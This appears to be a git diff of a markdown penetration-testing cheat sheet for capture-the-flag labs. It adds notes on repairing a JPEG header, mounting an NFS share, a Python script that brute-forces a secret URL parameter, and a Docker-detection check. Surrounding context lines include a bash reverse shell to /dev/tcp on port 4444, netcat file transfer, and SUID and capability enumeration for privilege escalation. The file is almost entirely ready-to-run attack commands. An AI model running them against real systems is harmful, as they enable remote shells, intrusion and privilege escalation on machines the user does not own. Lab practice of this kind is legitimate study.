@@ -61,6 +61,18 @@ bash -i >& /dev/tcp/10.18.22.27/4444 0>&1
 chmod 600 id_rsa
 ```
 
+#### broken png image
+```
+xxd thm.jpg | head
+printf '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01' | dd conv=notrunc of=thm.jpg bs=1
+```
+#### NFS share
+```
+mkdir tmp/
+sudo mount -t nfs 10.10.104.64: tmp
+tree tmp
+```
+
 ---
 #### File Transfer on `Netcat`
 
@@ -78,6 +90,21 @@ scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
 ```
 ---
 ### Web
+#### fuzz with python script
+```python
+#!/usr/bin/env python3
+
+import requests
+
+host = '10.10.109.114'
+url = 'http://{}/page/?secret={}'
+
+for i in range(100):
+    r = requests.get(url.format(host, i))
+    if not 'That is wrong!' in r.text:
+        print("Found secret: {}".format(i))
+        print(r.text)
+```
 #### Discover hidden directories:
 ```linux
 wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.47.7/island/2100/FUZZ.ticket
@@ -151,6 +178,7 @@ find / -type f -perm -04000 -ls 2>/dev/null #compare executables on this list wi
 getcap -r / 2>/dev/null
 cat /etc/exports #file sharing
 nmap --script=vuln <ip>
+cat /proc/1/cgroup #if u in docker
 ```
 ####  Automated Enumeration Tools
 * [linPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
